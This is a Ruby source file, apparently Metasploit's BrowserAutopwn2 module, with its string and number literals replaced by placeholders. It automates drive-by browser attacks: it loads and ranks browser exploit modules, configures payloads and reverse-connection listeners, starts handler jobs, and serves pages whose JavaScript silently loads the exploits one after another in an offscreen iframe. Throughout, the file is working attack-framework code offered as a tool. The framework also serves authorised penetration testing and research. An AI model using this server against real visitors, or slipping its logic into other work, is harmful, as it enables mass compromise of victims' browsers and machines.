require <str> module Msf module Exploit::Remote::BrowserAutopwn2 include Msf :: Exploit :: Remote :: BrowserExploitServer attr_reader <str> attr_reader <str> attr_reader <str> attr_reader <str> DEFAULT_PAYLOADS = { <str> : { <str> : <str> , <str> : <int> } , <str> : { <str> : <str> , <str> : <int> } , <str> : { <str> : <str> , <str> : <int> } , <str> : { <str> : <str> , <str> : <int> } , <str> : { <str> : <str> , <str> : <int> } , <str> : { <str> : <str> , <str> : <int> } , <str> : { <str> : <str> , <str> : <int> } , <str> : { <str> : <str> , <str> : <int> } } def init_exploits framework . exploits . each_pair do | fullname , place_holder | next if ! fullname . include? ( <str> ) || self . fullname == <str> fullname <str> next if datastore [ <str> ] && fullname !~ datastore [ <str> ] next if datastore [ <str> ] && fullname =~ datastore [ <str> ] mod = framework . exploits . create ( fullname ) unless mod print_status ( <str> fullname <str> ) next end if mod . kind_of? ( Msf :: Exploit :: Remote :: BrowserExploitServer ) @bap_exploits << mod end end end def browser_profile_prefix @browser_profile_prefix || = <str> Time . now . to_i <str> self . uuid <str> end def rm_exploit_jobs exploit_job_ids . each do | id | framework . jobs . stop_job ( id ) if framework . jobs [ id . to_s ] sleep ( <int> . <int> ) end end def rm_payload_jobs payload_job_ids . each do | id | framework . jobs . stop_job ( id ) if framework . jobs [ id . to_s ] end end def cleanup print_status ( <str> ) super configure_job_output ( false ) clear_browser_profiles rm_exploit_jobs rm_payload_jobs end def set_exploit_options ( xploit ) p = select_payload ( xploit ) xploit . datastore [ <str> ] = p . first [ <str> ] xploit . datastore [ <str> ] = p . first [ <str> ] xploit . datastore [ <str> ] = datastore [ <str> ] xploit . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] xploit . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] xploit . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] xploit . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] xploit . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] xploit . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] xploit . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] xploit . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] xploit . datastore [ <str> ] = get_payload_lhost xploit . datastore [ <str> ] = true xploit . datastore [ <str> ] = browser_profile_prefix xploit . datastore [ <str> ] = <str> assign_module_resource <str> xploit . datastore [ <str> ] = self . workspace xploit . register_parent ( self ) end def is_resource_taken? ( resource ) taken = false bap_exploits . each do | m | next unless m . datastore [ <str> ] return true if m . datastore [ <str> ] . index ( resource ) return true if resource . index ( m . datastore [ <str> ] ) end taken end def assign_module_resource resource = <str> while resource = Rex :: Text . rand_text_alpha ( rand ( <int> ) + <int> ) break unless is_resource_taken? ( resource ) end resource end def sort_bap_exploits bap_groups = group_bap_modules bap_groups = sort_date_in_group ( bap_groups ) bap_groups = sort_group_by_rank ( bap_groups ) finalize_sorted_modules ( bap_groups ) end def sort_date_in_group ( bap_groups ) bap_groups . each_pair do | ranking , module_list | bap_groups [ ranking ] = module_list . sort_by { | m | dstr = m . disclosure_date || <str> Date . parse ( dstr ) rescue Date . parse ( <str> ) } . reverse end end def sort_group_by_rank ( bap_groups ) Hash [ bap_groups . sort_by { | k , v | k } . reverse ] end def group_bap_modules bap_groups = { } RankingName . each_pair do | ranking , value | bap_groups [ ranking ] = [ ] bap_exploits . each do | m | next if m . rank != ranking bap_groups [ ranking ] << m end end bap_groups end def finalize_sorted_modules ( bap_groups ) @bap_exploits = [ ] bap_groups . each_pair do | ranking , module_list | module_list . each do | m | break if @bap_exploits . length > = datastore [ <str> ] @bap_exploits << m end end end def get_selected_payload_name ( platform ) payload_name = datastore [ <str> platform . to_s . upcase <str> ] return payload_name if framework . payloads . keys . include? ( payload_name ) default = DEFAULT_PAYLOADS [ platform ] [ <str> ] default end def get_selected_payload_lport ( platform ) datastore [ <str> platform . to_s . upcase <str> ] end def get_payload_lhost datastore [ <str> ] || Rex :: Socket . source_address end def start_payload_listeners return if datastore [ <str> ] == <int> wanted_payloads . uniq! { | e | e [ <str> ] } wanted_payloads . each do | wanted | multi_handler = framework . exploits . create ( <str> ) payload_name = wanted [ <str> ] . include? ( <str> ) ? wanted [ <str> ] . gsub ( <str> , <str> ) : wanted [ <str> ] multi_handler . datastore [ <str> ] = get_payload_lhost multi_handler . datastore [ <str> ] = payload_name multi_handler . datastore [ <str> ] = wanted [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = datastore [ <str> ] if datastore [ <str> ] multi_handler . datastore [ <str> ] = false multi_handler . datastore [ <str> ] = <str> multi_handler . datastore [ <str> ] = self . workspace multi_handler . register_parent ( self ) multi_handler . exploit_simple ( <str> = > nil , <str> = > nil , <str> = > payload_name , <str> = > true ) @payload_job_ids << multi_handler . job_id end end def parse_rank ( rank ) RankingName [ rank ] . to_s . capitalize end def is_payload_platform_compatible? ( m , payload_platform ) begin platform_obj = Msf :: Module :: Platform . find_platform ( payload_platform . to_s ) rescue ArgumentError false end return true if platform_obj && m . platform . platforms . include? ( platform_obj ) false end def is_payload_compatible? ( compatible_payloads , payload_name ) compatible_payloads . each do | k | return true if k [ <int> ] == payload_name end false end def is_multi_platform_exploit? ( m ) m . fullname . include? ( <str> ) end def select_payload ( m ) compatible_payloads = [ ] module_payloads = nil DEFAULT_PAYLOADS . each_pair do | platform , info | payload_choice = { <str> = > get_selected_payload_name ( platform ) , <str> = > get_selected_payload_lport ( platform ) } if ! is_multi_platform_exploit? ( m ) && ! m . platform . platforms . empty? && is_payload_platform_compatible? ( m , platform ) compatible_payloads << payload_choice break else module_payloads || = m . compatible_payloads if is_payload_compatible? ( module_payloads , payload_choice [ <str> ] ) compatible_payloads << payload_choice end end end @wanted_payloads . concat ( compatible_payloads ) compatible_payloads end def start_exploits bap_exploits . each do | m | set_exploit_options ( m ) m . exploit_simple ( <str> = > nil , <str> = > nil , <str> = > true , <str> = > <int> , <str> = > m . datastore [ <str> ] , <str> = > true ) @exploit_job_ids << m . job_id end end def setup t1 = Time . now super @bap_exploits = [ ] @exploit_job_ids = [ ] @payload_job_ids = [ ] @wanted_payloads = [ ] @whitelist = datastore [ <str> ] ? datastore [ <str> ] . split : nil print_status ( <str> ) init_exploits sort_bap_exploits print_status ( <str> ) start_exploits print_status ( <str> ) start_payload_listeners t2 = Time . now print_status ( <str> ( t2 - t1 ) . inspect <str> ) configure_job_output ( true ) end def configure_job_output ( on = true ) ( @exploit_job_ids + @payload_job_ids ) . each do | jid | job = framework . jobs [ jid . to_s ] next unless job job . ctx . each do | m | next unless m . respond_to? <str> m . user_output = on ? self . user_output : nil break end end end def show_ready_exploits columns = [ <str> , <str> , <str> , <str> , <str> ] columns . delete ( <str> ) if ! datastore [ <str> ] table = Rex :: Ui :: Text :: Table . new ( <str> = > <str> , <str> = > <int> , <str> = > columns ) order = <int> bap_exploits . each do | m | row = [ ] row << order row << parse_rank ( m . rank ) row << m . shortname row << m . datastore [ <str> ] if datastore [ <str> ] row << <str> m . datastore [ <str> ] <str> m . datastore [ <str> ] <str> table << row order += <int> end print_line print_status ( <str> ) print_status ( <str> ) print_line print_line table . to_s end def start_service super show_ready_exploits proto = ( datastore [ <str> ] ? <str> : <str> ) if datastore [ <str> ] && datastore [ <str> ] != <str> srvhost = datastore [ <str> ] elsif datastore [ <str> ] && datastore [ <str> ] != <str> srvhost = datastore [ <str> ] else srvhost = Rex :: Socket . source_address end if datastore [ <str> ] && datastore [ <str> ] != <int> srvport = datastore [ <str> ] else srvport = datastore [ <str> ] end service_uri = <str> proto <str> srvhost <str> srvport <str> get_resource <str> print_good ( <str> ) print_good ( <str> service_uri <str> ) end def get_suitable_exploits ( cli , request ) current_exploit_list = [ ] tag = retrieve_tag ( cli , request ) profile_info = browser_profile [ tag ] bap_exploits . each do | m | if m . get_bad_requirements ( profile_info ) . empty? current_exploit_list << m end end if datastore [ <str> ] show_exploit_list ( cli . peerhost , tag , current_exploit_list ) end current_exploit_list end def log_click ( ip , data = <str> ) report_note ( <str> = > ip , <str> = > <str> , <str> = > data , <str> = > <str> ) end def show_exploit_list ( ip , tag , current_exploit_list ) order = <int> table = Rex :: Ui :: Text :: Table . new ( <str> = > <str> , <str> = > <int> , <str> = > [ <str> , <str> , <str> ] ) current_exploit_list . each do | m | table << [ order , ip , m . shortname ] order += <int> end if table . rows . empty? print_status ( <str> cli . peerhost <str> tag <str> ) else log_click ( cli . peerhost , table . to_csv ) print_status ( <str> cli . peerhost <str> tag <str> table <str> ) end end def get_exploit_urls ( cli , request ) urls = [ ] exploit_list = get_suitable_exploits ( cli , request ) exploit_list . each do | mod | proto = datastore [ <str> ] ? <str> : <str> host = <str> if datastore [ <str> ] && datastore [ <str> ] != <str> host = datastore [ <str> ] elsif datastore [ <str> ] && datastore [ <str> ] != <str> host = datastore [ <str> ] else host = Rex :: Socket . source_address end if datastore [ <str> ] && datastore [ <str> ] != <int> port = datastore [ <str> ] else port = datastore [ <str> ] end resource = mod . datastore [ <str> ] url = <str> proto <str> host <str> port <str> resource <str> urls << url end urls end def on_request_uri ( cli , request ) if @whitelist && ! is_ip_targeted? ( cli . peerhost ) print_status ( <str> ) send_not_found ( cli ) return end log_click ( cli . peerhost ) super end def is_ip_targeted? ( cli_ip ) return true unless @whitelist @whitelist . include? ( cli_ip ) end def session_count total = <int> payload_job_ids . each do | id | job_workspace = framework . jobs [ id . to_s ] . ctx . first . datastore [ <str> ] if job_workspace == self . workspace total += framework . jobs [ id . to_s ] . ctx . first . session_count end end total end def get_custom_404_url datastore [ <str> ] . to_s end def build_html ( cli , request ) exploit_list = get_exploit_urls ( cli , request ) if datastore [ <str> ] > - <int> && session_count > = datastore [ <str> ] print_status ( <str> datastore [ <str> ] <str> ) if datastore [ <str> ] . blank? send_not_found ( cli ) return <str> else return datastore [ <str> ] end elsif exploit_list . empty? print_status ( <str> ) if datastore [ <str> ] . blank? send_not_found ( cli ) return <str> else return datastore [ <str> ] end end js = <str> exploit_list . map! <str> e | <str> e <str> } * <str> } ] ; function setElementStyle ( e , opts ) { if ( typeof e . style . setAttribute == <str> ) { var attributeString = <str> ; for ( var key in opts ) { attributeString += key + <str> + opts [ key ] + <str> } e . setAttribute ( <str> , attributeString ) ; } else { for ( var key in opts ) { e . style . setAttribute ( key , opts [ key ] ) ; } } } function moveIframe ( e ) { var opts = { <str> : <str> , <str> : screen . width * - screen . width } setElementStyle ( e , opts ) ; } window . onload = function ( ) { var e = document . createElement ( <str> ) ; e . setAttribute ( <str> , <str> ) ; moveIframe ( e ) ; document . body . appendChild ( e ) ; loadExploit ( ) ; } function loadExploit ( ) { var e = document . getElementById ( <str> ) ; var firstUri = exploitList . splice ( <int> , <int> ) ; if ( firstUri != <str> ) { e . setAttribute ( <str> , firstUri ) ; setTimeout ( <str> , } } | <str> js <str> datastore [ <str> ] <str> end end end 
